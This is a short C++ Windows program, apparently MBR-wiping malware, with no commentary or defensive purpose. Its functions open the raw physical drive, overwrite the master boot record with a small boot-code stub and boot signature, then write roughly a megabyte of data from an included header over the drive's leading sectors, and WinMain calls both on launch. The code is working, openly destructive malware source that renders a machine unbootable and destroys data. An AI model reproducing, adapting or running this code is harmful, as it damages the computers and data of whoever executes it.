#include <Windows.h>
#include <iostream>
#include <stdlib.h>
#include <time.h> 
#include <stdio.h>
#include "disk.h"

using namespace std;


unsigned char   scode[] =
"\xb8\x12\x00"
"\xcd\x10\xbd"
"\x18\x7c\xb9";
DWORD fuckmbr()
{
	DWORD dwBytesReturned;
	BYTE pMBR[512] = { 0 };
	memcpy(pMBR, scode, sizeof(scode));
	pMBR[510] = 0x55;
	pMBR[511] = 0xaa;
	HANDLE hDevice = CreateFile(TEXT("\\\\.\\PhysicalDrive0"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		return -1;
	}
	DeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
	WriteFile(hDevice, pMBR, 512, &dwBytesReturned, NULL);
	DeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
	return 0;
}

void logicallock() {
	HANDLE drive = CreateFile(TEXT("\\\\.\\PhysicalDrive0"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);


	if (drive == INVALID_HANDLE_VALUE)
		ExitProcess(2);

	DWORD wb;
	if (!WriteFile(drive, sectordata, 1024000, &wb, NULL))
		ExitProcess(3);

	CloseHandle(drive);
}

int WINAPI WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow
)
{
	fuckmbr();
	logicallock();
	return 0;
}